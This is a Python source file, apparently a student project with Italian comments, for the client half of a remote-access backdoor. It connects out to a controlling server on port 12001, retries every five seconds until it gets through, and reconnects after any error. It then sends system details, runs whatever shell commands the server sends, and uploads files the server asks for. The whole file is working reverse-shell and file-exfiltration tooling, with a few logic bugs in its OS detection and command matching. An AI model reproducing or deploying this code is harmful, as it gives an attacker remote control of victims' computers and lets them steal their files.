from socket import *
import subprocess
import platform
import os
import time

windowsFlag = "n"


def sendDir(clientSocket, cmd):
    shellCommandExecuter(clientSocket, cmd)


def exitNClose(clientSocket):
    out = "Ok"
    clientSocket.send(out.encode())
    return True


def changeDirectory(clientSocket, cmd):
    out = ""
    if cmd != "cd":
        cmd = cmd.replace("cd ", "")
    try:
        os.chdir(cmd)
        os.system("dir")
        out = os.getcwd()
    except:
        out = "Path not found"
    clientSocket.send(out.encode())


def getFile(clientSocket, fileName):
    fileSize = os.path.getsize(fileName)
    fileSize = str(fileSize)
    clientSocket.send(fileSize.encode())
    fileSize = int(fileSize)
    file = open(fileName, 'rb')
    while fileSize > 0:
        if fileSize < 1024:
            l = file.read(fileSize)
        else:
            l = file.read(1024)
        fileSize = fileSize - 1024
        clientSocket.send(l)
        print("Caricamento...")
    print("Inviato")
    file.close()


def StartConnection():  # apre la connessione con il server
    serverName = 'localhost'
    serverPort = 12001
    clientSocket = socket(AF_INET, SOCK_STREAM)

    while True:
        try:
            clientSocket.connect((serverName, serverPort))
            break
        except:
            print("Server down")

        time.sleep(5)

    return clientSocket


def sendOsInfo(clientSocket: socket):  # funzione che invia informazioni di sistema
    pack = "Architecture: " + platform.architecture()[
        0] + "\nMacchine: " + platform.machine() + "\nSystem name: " + platform.system()
    pack = pack + "\nOperating system release: " + platform.release() + "\nOperating system version: " + \
           platform.version() + "\nNode: " + platform.node() + "\nPlatform: " + platform.platform() + "\nProcessor: " + platform.processor()
    clientSocket.send(pack.encode())


def RecuperaOs(clientSocket: socket):
    global windowsFlag
    if platform.machine().find("Windows"):
        clientSocket.send("w".encode())
        windowsFlag = "w"
    else:
        clientSocket.send("u".encode())
        windowsFlag = "u"


def searchCmd(clientSocket, cmd):
    try:
        shellCommandExecuter(clientSocket, cmd)
        return True
    except:
        clientSocket.send("notFound".encode())
        return False


def shellCommandExecuter(clientSocket, cmd):
    output = subprocess.check_output(cmd, shell=True).decode("utf-8", "ignore")
    pSize = str(output.__sizeof__())
    clientSocket.send(pSize.encode())
    clientSocket.recv(1024) #87
    clientSocket.send(output.encode()) #88


def main():
    while True:
        try:
            clientSocket = StartConnection()
            RecuperaOs(clientSocket)
            esc = False

            while not esc:
                cmd = clientSocket.recv(1024).decode()
                if len(cmd) == 0:
                    break

                elif cmd == "dir" or "ls" in cmd:
                    if windowsFlag == "w":
                        sendDir(clientSocket, "dir")
                    else:
                        sendDir(clientSocket, "ls")

                elif "cd" in cmd:
                    changeDirectory(clientSocket, cmd)

                elif cmd == "esc":
                    esc = exitNClose(clientSocket)

                elif "get" in cmd:
                    path = ""
                    fileName = cmd.replace("get ", "")
                    path = os.path.join(path, os.getcwd(), fileName)
                    print(path)
                    if os.path.exists(path):
                        clientSocket.send("ok".encode())
                        getFile(clientSocket, fileName)
                    else:
                        clientSocket.send("ko".encode())

                elif cmd == "infoOs":
                    sendOsInfo(clientSocket)

                elif "search" in cmd:
                    shellCommand = clientSocket.recv(1024).decode() #78
                    if searchCmd(clientSocket, shellCommand):
                        print("true")
                        path = clientSocket.recv(1024).decode() #155
                        changeDirectory(clientSocket, "cd " + path)

        except Exception as e:
            print(e)
            print("errore Riavvio in corso")
            clientSocket.close()


if __name__ == "__main__":
    main()
